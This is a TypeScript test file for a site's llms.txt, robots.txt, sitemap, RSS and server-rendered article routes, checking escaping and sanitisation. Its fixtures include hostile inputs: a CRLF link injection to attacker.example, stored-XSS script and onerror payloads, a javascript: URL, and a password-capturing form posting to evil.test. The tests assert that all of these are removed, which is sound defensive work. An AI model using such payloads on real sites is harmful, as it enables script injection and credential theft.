import { afterEach, describe, expect, it, vi } from 'vitest';
import request from 'supertest';
import { HTTPServer } from '../../src/http.js';

const queryMock = vi.hoisted(() => vi.fn());
const ORIGINAL_WORKOS_ENV = vi.hoisted(() => ({
  apiKey: process.env.WORKOS_API_KEY,
  clientId: process.env.WORKOS_CLIENT_ID,
}));

vi.hoisted(() => {
  process.env.WORKOS_API_KEY = process.env.WORKOS_API_KEY || 'sk_test_perspectives_crawlability';
  process.env.WORKOS_CLIENT_ID = process.env.WORKOS_CLIENT_ID || 'client_test_perspectives_crawlability';
});

vi.mock('../../src/config.js', async () => {
  const actual = await vi.importActual('../../src/config.js');
  return {
    ...actual,
    getDatabaseConfig: vi.fn().mockReturnValue({
      connectionString: 'postgresql://localhost/test',
    }),
  };
});

vi.mock('../../src/db/client.js', () => ({
  initializeDatabase: vi.fn(),
  getPool: vi.fn().mockReturnValue({ query: queryMock }),
  isDatabaseInitialized: vi.fn().mockReturnValue(true),
  closeDatabase: vi.fn(),
  healthCheck: vi.fn().mockResolvedValue(undefined),
}));

vi.mock('../../src/db/migrate.js', () => ({
  runMigrations: vi.fn().mockResolvedValue(undefined),
}));

const perspectiveRows = [
  {
    slug: 'agentic-crawlability',
    content_type: 'article',
    title: 'Agentic crawlability & discovery',
    excerpt: 'How AI crawlers find member perspectives.',
    external_url: null,
    author_name: 'Avery Writer',
    published_at: new Date('2026-06-01T12:00:00Z'),
    updated_at: new Date('2026-06-02T12:00:00Z'),
  },
  {
    slug: 'xml-escaping',
    content_type: 'article',
    title: 'Signals <Strategy> & "Safety"',
    excerpt: 'Escapes <unsafe> & quoted text.',
    external_url: null,
    author_name: 'Casey & Co.',
    published_at: new Date('2026-05-30T12:00:00Z'),
    updated_at: new Date('2026-05-30T12:00:00Z'),
  },
  {
    slug: 'external-perspective',
    content_type: 'link',
    title: 'Partner [view] (field notes)',
    excerpt: 'External (but curated) perspective with [brackets].',
    external_url: 'https://partner.example/field-notes',
    author_name: 'Drew Curator',
    published_at: new Date('2026-05-29T12:00:00Z'),
    updated_at: new Date('2026-05-29T12:00:00Z'),
  },
];

describe('Perspectives crawlability routes', () => {
  let server: HTTPServer | undefined;

  afterEach(async () => {
    queryMock.mockReset();
    await server?.stop();
    server = undefined;
    if (ORIGINAL_WORKOS_ENV.apiKey === undefined) {
      delete process.env.WORKOS_API_KEY;
    } else {
      process.env.WORKOS_API_KEY = ORIGINAL_WORKOS_ENV.apiKey;
    }
    if (ORIGINAL_WORKOS_ENV.clientId === undefined) {
      delete process.env.WORKOS_CLIENT_ID;
    } else {
      process.env.WORKOS_CLIENT_ID = ORIGINAL_WORKOS_ENV.clientId;
    }
  });

  function app() {
    server = new HTTPServer();
    return (server as unknown as { app: unknown }).app;
  }

  it('serves dynamic llms.txt with published perspective URLs before static llms.txt', async () => {
    queryMock.mockResolvedValue({ rows: perspectiveRows });

    const httpApp = app();
    const res = await request(httpApp).get('/llms.txt').set('Host', 'agenticadvertising.org');

    expect(res.status).toBe(200);
    expect(res.headers['content-type']).toContain('text/plain');
    expect(res.headers['cache-control']).toBe('public, max-age=300');
    expect(res.text).toContain('# AgenticAdvertising.org');
    expect(res.text).toContain('## Perspectives');
    expect(res.text).toContain('[Agentic crawlability & discovery](<https://agenticadvertising.org/perspectives/agentic-crawlability>)');
    expect(res.text).toContain('[Partner \\[view\\] \\(field notes\\)](<https://partner.example/field-notes>): External \\(but curated\\) perspective with \\[brackets\\].');
    expect(res.text).toContain('[Perspectives RSS feed](<https://agenticadvertising.org/perspectives/feed.xml>)');
    expect(res.text).not.toContain('# AdCP - Ad Context Protocol');
    expect(queryMock).toHaveBeenCalledWith(expect.stringContaining("p.status = 'published'"), [200]);
    expect(queryMock).toHaveBeenCalledWith(expect.stringContaining('p.is_members_only = false'), [200]);
  });

  it('normalizes legacy URLs, fails closed on controls, and contains Markdown delimiters', async () => {
    queryMock.mockResolvedValue({
      rows: [
        {
          ...perspectiveRows[2],
          slug: 'legacy-control',
          title: 'Legacy control',
          external_url: 'https://trusted.example/report\r\n- [Injected](https://attacker.example)',
        },
        {
          ...perspectiveRows[2],
          slug: 'valid-parentheses',
          title: 'Valid parentheses',
          external_url: 'https://Trusted.Example:443/reports/agentic_(roundup)',
        },
        {
          ...perspectiveRows[2],
          slug: 'legacy-angle',
          title: 'Legacy angle',
          external_url: 'https://trusted.example/report>injected',
        },
      ],
    });

    const httpApp = app();
    const res = await request(httpApp).get('/llms.txt').set('Host', 'agenticadvertising.org');

    expect(res.status).toBe(200);
    expect(res.text).toContain('[Legacy control](<https://agenticadvertising.org/perspectives/legacy-control>)');
    expect(res.text).toContain('[Valid parentheses](<https://trusted.example/reports/agentic_(roundup)>)');
    expect(res.text).toContain('[Legacy angle](<https://agenticadvertising.org/perspectives/legacy-angle>)');
    expect(res.text).not.toContain('attacker.example');
    expect(res.text).not.toContain('\n- [Injected]');

    const rss = await request(httpApp).get('/perspectives/feed.xml').set('Host', 'agenticadvertising.org');
    expect(rss.status).toBe(200);
    expect(rss.text).toContain('<link>https://agenticadvertising.org/perspectives/legacy-control</link>');
    expect(rss.text).toContain('<link>https://trusted.example/reports/agentic_(roundup)</link>');
    expect(rss.text).not.toContain('attacker.example');
  });

  it('falls through to the static protocol llms.txt on the AdCP host', async () => {
    const res = await request(app()).get('/llms.txt').set('Host', 'adcontextprotocol.org');

    expect(res.status).toBe(200);
    expect(res.text).toContain('# AdCP - Ad Context Protocol');
    expect(res.text).not.toContain('## Perspectives');
    expect(queryMock).not.toHaveBeenCalled();
  });

  it('serves the same llms.txt from the well-known path', async () => {
    queryMock.mockResolvedValue({ rows: perspectiveRows });

    const res = await request(app()).get('/.well-known/llms.txt').set('Host', 'agenticadvertising.org');

    expect(res.status).toBe(200);
    expect(res.text).toContain('https://agenticadvertising.org/perspectives/agentic-crawlability');
  });

  it('serves host-aware robots.txt before the shared static file', async () => {
    const aao = await request(app()).get('/robots.txt').set('Host', 'agenticadvertising.org');

    expect(aao.status).toBe(200);
    expect(aao.headers['cache-control']).toBe('public, max-age=300');
    expect(aao.text).toContain('Sitemap: https://agenticadvertising.org/sitemap.xml');
    expect(aao.text).toContain('Llms-txt: https://agenticadvertising.org/llms.txt');
    expect(aao.text).not.toContain('Llms-txt: https://adcontextprotocol.org/llms.txt');

    await server?.stop();
    server = undefined;

    const adcp = await request(app()).get('/robots.txt').set('Host', 'adcontextprotocol.org');
    expect(adcp.status).toBe(200);
    expect(adcp.text).toContain('Sitemap: https://adcontextprotocol.org/sitemap.xml');
    expect(adcp.text).toContain('Llms-txt: https://adcontextprotocol.org/llms.txt');
  });

  it('keeps sitemap generation scoped to first-party published article pages', async () => {
    queryMock.mockResolvedValue({ rows: [perspectiveRows[0]] });

    const res = await request(app()).get('/sitemap.xml').set('Host', 'agenticadvertising.org');

    expect(res.status).toBe(200);
    expect(res.text).toContain('https://agenticadvertising.org/perspectives/agentic-crawlability');
    expect(queryMock).toHaveBeenCalledWith(expect.stringContaining("p.content_type = 'article'"));
    expect(queryMock).toHaveBeenCalledWith(expect.stringContaining('p.is_members_only = false'));
    expect(queryMock).toHaveBeenCalledWith(expect.stringContaining("p.source_type IS NULL OR p.source_type NOT IN ('rss', 'email')"));
  });

  it('serves an RSS feed for perspectives and XML-escapes article fields', async () => {
    queryMock.mockResolvedValue({ rows: perspectiveRows });

    const res = await request(app()).get('/perspectives/feed.xml').set('Host', 'agenticadvertising.org');

    expect(res.status).toBe(200);
    expect(res.headers['content-type']).toContain('application/rss+xml');
    expect(res.headers['cache-control']).toBe('public, max-age=300');
    expect(res.text).toContain('<rss version="2.0"');
    expect(res.text).toContain('<title>Agentic crawlability &amp; discovery</title>');
    expect(res.text).toContain('<dc:creator>Casey &amp; Co.</dc:creator>');
    expect(res.text).toContain('<title>Signals &lt;Strategy&gt; &amp; &quot;Safety&quot;</title>');
    expect(res.text).toContain('<description>Escapes &lt;unsafe&gt; &amp; quoted text.</description>');
    expect(res.text).toContain('<link>https://partner.example/field-notes</link>');
    expect(res.text).toContain('<pubDate>Mon, 01 Jun 2026 12:00:00 GMT</pubDate>');
  });

  it('returns 404 for a missing published perspective while serving the article shell', async () => {
    queryMock.mockResolvedValueOnce({ rows: [] });

    const res = await request(app())
      .get('/perspectives/does-not-exist')
      .set('Host', 'agenticadvertising.org');

    expect(res.status).toBe(404);
    expect(res.headers['content-type']).toContain('text/html');
    expect(res.text).toContain('id="loadingState"');
    expect(res.text).toContain('id="mainContent"');
    expect(queryMock).toHaveBeenCalledWith(
      expect.stringContaining("p.status = 'published'"),
      ['does-not-exist']
    );
  });

  it('server-renders published perspective content and sanitizes stored markdown', async () => {
    queryMock.mockResolvedValueOnce({
      rows: [{
        slug: 'crawlable-article',
        title: 'Crawlable <Perspective>',
        subtitle: 'Readable before JavaScript runs',
        category: 'Research',
        excerpt: 'An article that crawlers can read.',
        content: '## Initial HTML\n\nThe complete article body is here.\n\n| Safe | Table |\n| --- | --- |\n| Cell | Value |\n\n<script>alert("stored-xss")</script>\n\n<img src="x" onerror="alert(1)">\n\n<form action="https://evil.test/steal" style="position:fixed;inset:0"><input type="password"><button>Sign in</button></form>',
        author_name: 'Avery Writer',
        author_title: 'Editor',
        author_slug: 'avery-writer',
        featured_image_url: null,
        published_at: new Date('2026-06-01T12:00:00Z'),
        updated_at: new Date('2026-06-02T12:00:00Z'),
        tags: ['agentic', 'research'],
        like_count: 4,
      }],
    });

    const httpApp = app();
    const res = await request(httpApp)
      .get('/perspectives/crawlable-article')
      .set('Host', 'agenticadvertising.org');

    expect(res.status).toBe(200);
    expect(res.text).toContain('<title id="pageTitle">Crawlable &lt;Perspective&gt; | AgenticAdvertising.org</title>');
    expect(res.text).toContain('<h1 id="heroTitle">Crawlable &lt;Perspective&gt;</h1>');
    expect(res.text).toContain('<h2>Initial HTML</h2>');
    expect(res.text).toContain('The complete article body is here.');
    expect(res.text).toContain('<table>');
    expect(res.text).toContain('<td>Cell</td>');
    expect(res.text).toContain('href="/community/people/avery-writer"');
    expect(res.text).toContain('id="loadingState" class="loading-state" hidden');
    expect(res.text).toContain('data-server-rendered="true"');
    expect(res.text).not.toContain('alert("stored-xss")');
    expect(res.text).not.toContain('onerror="alert(1)"');
    expect(res.text).not.toContain('<form');
    expect(res.text).not.toContain('<input');
    expect(res.text).not.toContain('position:fixed');
    expect(res.text).not.toContain('evil.test');
    expect(queryMock).toHaveBeenCalledWith(
      expect.stringContaining('p.is_members_only = false'),
      ['crawlable-article']
    );

  });

  it('server-renders Stories cards and news while retaining safe link boundaries', async () => {
    queryMock
      .mockResolvedValueOnce({
        rows: [
          {
            slug: 'official-report',
            title: 'Official <Report>',
            subtitle: null,
            category: 'Research',
            excerpt: 'The official summary.',
            external_url: null,
            author_name: 'Avery Writer',
            featured_image_url: null,
            published_at: new Date('2026-06-01T12:00:00Z'),
            tags: ['strategy'],
            content_origin: 'official',
          },
          ...Array.from({ length: 6 }, (_, index) => ({
            slug: `official-report-${index + 2}`,
            title: `Official report ${index + 2}`,
            subtitle: null,
            category: 'Research',
            excerpt: `Official summary ${index + 2}.`,
            external_url: null,
            author_name: 'Avery Writer',
            featured_image_url: null,
            published_at: new Date('2026-05-31T12:00:00Z'),
            tags: ['strategy'],
            content_origin: 'official',
          })),
          {
            slug: 'member-view',
            title: 'Member View',
            subtitle: null,
            category: 'Perspective',
            excerpt: 'A member contribution.',
            external_url: 'javascript:alert(1)',
            author_name: 'Casey Member',
            featured_image_url: null,
            published_at: new Date('2026-05-30T12:00:00Z'),
            tags: ['agentic'],
            content_origin: 'member',
          },
        ],
      })
      .mockResolvedValueOnce({
        rows: [{
          title: 'Industry &amp; Agents',
          source_url: 'https://news.example/agents',
          summary: 'A useful &amp; safe summary.',
          addie_notes: null,
          relevance_tags: ['ai-agents'],
          feed_name: 'Example News',
        }],
      });

    const httpApp = app();
    const res = await request(httpApp).get('/stories').set('Host', 'agenticadvertising.org');

    expect(res.status).toBe(200);
    expect(res.text).toContain('Official &lt;Report&gt;');
    expect(res.text).toContain('Official report 7');
    expect(res.text).toContain('href="/perspectives/member-view"');
    expect(res.text).not.toContain('javascript:alert(1)');
    expect(res.text).toContain('href="https://news.example/agents"');
    expect(res.text).toContain('Industry &amp; Agents');
    expect(res.text).toContain('A useful &amp; safe summary.');
    expect(queryMock).toHaveBeenCalledTimes(2);
    expect(queryMock.mock.calls[0][0]).toContain('p.is_members_only = false');

  });

  it('keeps members-only perspectives out of the anonymous JSON API', async () => {
    queryMock.mockResolvedValueOnce({ rows: perspectiveRows });

    const res = await request(app())
      .get('/api/perspectives')
      .set('Host', 'agenticadvertising.org');

    expect(res.status).toBe(200);
    expect(queryMock).toHaveBeenCalledWith(
      expect.stringContaining('p.is_members_only = false'),
      [100]
    );
  });

  it('serves working group post canonical pages with server-rendered social meta tags', async () => {
    queryMock.mockResolvedValueOnce({
      rows: [{
        title: 'Audio as a Native SI Surface',
        subtitle: null,
        excerpt: 'Why sponsored intelligence needs audio-native formats.',
        content: 'Fallback content should not be used when an excerpt exists.',
        featured_image_url: '/api/perspectives/audio-as-a-native-si-surface/assets/cover.png',
        author_name: 'Riley Author',
        published_at: new Date('2026-06-08T14:00:00Z'),
        updated_at: new Date('2026-06-09T14:00:00Z'),
        group_name: 'Sponsored Intelligence',
        group_description: 'Working group description.',
        group_slug: 'sponsored-intelligence',
      }],
    });

    const res = await request(app())
      .get('/working-groups/sponsored-intelligence/posts/audio-as-a-native-si-surface')
      .set('Host', 'agenticadvertising.org');

    expect(res.status).toBe(200);
    expect(res.headers['content-type']).toContain('text/html');
    expect(queryMock).toHaveBeenCalledWith(expect.stringContaining('wg.slug = $1'), [
      'sponsored-intelligence',
      'audio-as-a-native-si-surface',
    ]);
    expect(res.text).toContain('<meta property="og:type" content="article">');
    expect(res.text).toContain('<meta property="og:title" id="ogTitle" content="Audio as a Native SI Surface | Sponsored Intelligence">');
    expect(res.text).toContain('<meta property="og:description" id="ogDescription" content="Why sponsored intelligence needs audio-native formats.">');
    expect(res.text).toContain('<meta property="og:image" id="ogImage" content="https://agenticadvertising.org/api/perspectives/audio-as-a-native-si-surface/assets/cover.png">');
    expect(res.text).toContain('<link rel="canonical" id="canonicalUrl" href="https://agenticadvertising.org/working-groups/sponsored-intelligence/posts/audio-as-a-native-si-surface">');
  });
});
